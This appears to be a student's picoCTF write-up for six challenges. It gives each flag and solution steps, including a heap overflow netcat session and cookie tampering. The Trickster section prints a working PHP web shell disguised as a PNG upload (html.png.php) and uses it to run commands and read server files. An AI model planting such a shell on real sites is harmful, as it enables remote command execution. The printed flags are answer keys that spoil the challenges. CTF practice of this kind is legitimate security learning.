# login(Web Exploitation)
## flag
picoCTF{53rv3r_53rv3r_53rv3r_53rv3r_53rv3r}

Step 1:
This question was honestly very basic just went to the website and tried to inspect it and the page source.
Firstly didnt find anything so tried burpsuite, didnt find anything there as well.
Went back to the inspect element and tried to see the js code written, there I found a code and found an encoded base64 string which I decided to decode and got the flag.
![image](https://github.com/user-attachments/assets/48051a73-999a-45b3-a8f4-560249fd6d70)

Learnings:
No new learnings


No References.

## heap 1 (Binary Exploitation)

Flag
~~~
bash
picoCTF{starting_to_get_the_hang_c588b8a1}
~~~


Step 1:
In this challenge, just like heap 0, I opened the source code and the instance and this was just like heap 0.
But at first I didnt notice the difference between both and just tried what I did in heap 0 to obtain the flag.
Knowing that there would of course be some catch but still did it and it of course didnt work.
Step 2:
Went to the source code and carefully examined it.
That is when I saw it, the safe word shouldnt be pico or it wouldnt give me the flag.
Step 3:
So at first I entered all the alpha numeric characters to figure out which ones overflow to the safe var, once discovered that I entered such a string that would overflow pico to the safe var and give me the flag and it did.

![image](https://github.com/user-attachments/assets/f1dd9d56-e857-4663-931d-1f261ae7aea9)
![image](https://github.com/user-attachments/assets/144bccb4-0f7d-4d23-b4bd-1fc07cb58597)


Code and Terminal Output
~~~
bash
 nc tethys.picoctf.net 51553

Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x5f7d1207b2b0  ->   pico
+-------------+----------------+
[*]   0x5f7d1207b2d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: abcdefghijklmnopqrstuvwxyz123456pico

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x5f7d1207b2b0  ->   abcdefghijklmnopqrstuvwxyz123456pico
+-------------+----------------+
[*]   0x5f7d1207b2d0  ->   pico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{starting_to_get_the_hang_c588b8a1}
~~~


Learnings:
A) nothing new learnt as such just a key takeaway to not straight dive into the question, instead taking a little time to read the source code and understand what the question actually requires.



# Power Cookie(Web Exploitation)
## flag
picoCTF{gr4d3_A_c00k13_0d351e23}

Step 1: This one as well was very basic, just inspected the website found a js code which had isAdmin=0 which meant that I was a guest hence I made isAdmin=1 which gave me admin access hence I logged in and got the flag.
![image](https://github.com/user-attachments/assets/23d6dfc0-b24b-4fc8-89a8-de14ca321aa5)


![image](https://github.com/user-attachments/assets/2a6eb9b4-9419-44d7-a953-20ef8b0998c3)

# CVE-XXXX-XXXX
## flag
picoCTF{CVE-2021-34527}

Step 1:
Just researched the given info which was given in the question and literally recieved all the data on it on this website(in the references).
![image](https://github.com/user-attachments/assets/217c3cf6-e6fd-41ba-9478-eaf395b0cd0a)

Learnings:
A) learnt about the vulnerability in the windows print spooler service(in 2021) in which a hacker had full rights to the system.

References:
https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=windows+print+spooler

# Ascii Numbers(General Skills)
## flag
picoCTF{45c11_n0_qu35710n5_1ll_t311_y3_n0_l135_445d4180}

Step 1:
Nothing as such to do in this challenge, just to convert string of hexadecimal characters to ascii readable text.

No learnings.

References:
cyber chef

# Trickster(web exp)
## Flag
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_03d1d548}

Step 1:
Was given a website, on which visiting I saw that the website takes png files as uploads.
In the website I started to upload a random png file and uploaded it and saw that it did nothing only that it accepted if the file type was png otherwise it gave an error.
Step 2:
Now thanks to advent of cyber, I knew that when there were file uploads, a php webshell could be created to make an executable web shell on the website which can be used to access files uploaded on the website.
So I searched on google how to make an executable webshell which I saved. The code was as follows:
~~~
PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
~~~
The png at the start has been added to disguise the webshell as png file.
I renamed the file and saved it as html.png.php
Step 3:
I uploaded the file and visited the /uploads URL which gave me this:
![image](https://github.com/user-attachments/assets/2e7fcd01-6a27-450d-a82a-11d6f529c83d)

Once here, I decided to execute ls -al /var/www/html to find all the files in that directory.

![image](https://github.com/user-attachments/assets/8f3170b1-6895-4769-969e-b3eae236e983)

Then I decided to cat the GAZWIMLEGU2DQ.txt file and it gave me the flag.

![image](https://github.com/user-attachments/assets/60d843ae-73c7-4c07-ac12-87a04bc20d4b)






